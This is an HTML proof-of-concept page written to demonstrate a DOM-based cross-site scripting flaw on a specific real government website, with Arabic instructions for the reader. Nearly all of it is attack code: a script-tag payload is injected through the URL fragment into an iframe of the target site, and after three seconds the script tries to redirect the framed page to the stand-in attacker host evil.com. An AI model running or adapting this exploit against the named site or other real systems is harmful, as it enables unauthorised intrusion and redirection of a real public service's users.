<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PoC – DOM XSS + Redirect – aq.riyadhenv.gov.sa</title>
</head>
<body>
  <h3>🚨 DOM XSS PoC + Redirect – aq.riyadhenv.gov.sa</h3>
  <p>سيتم فتح iframe فيه الموقع المستهدف، وإذا ظهرت رسالة التنبيه من نفس الموقع، فالموقع مصاب. بعد 3 ثوانٍ يتم التوجيه.</p>

  <iframe id="exploitFrame" style="width:100%; height:300px; border:1px solid #ccc;"></iframe>

  <script>
    const payload = encodeURIComponent(`<script>alert(document.domain)</script>`);
    const target = "https://aq.riyadhenv.gov.sa/#q=" + payload;
    const iframe = document.getElementById("exploitFrame");

    // فتح الموقع المصاب في iframe مع كود يظهر الدومين
    iframe.src = target;

    // بعد 3 ثوانٍ، نحاول التوجيه إلى موقع خارجي
    setTimeout(() => {
      try {
        iframe.contentWindow.location = "https://evil.com";
      } catch (e) {
        console.warn("Redirection blocked by CSP.");
      }
    }, 3000);
  </script>
</body>
</html>
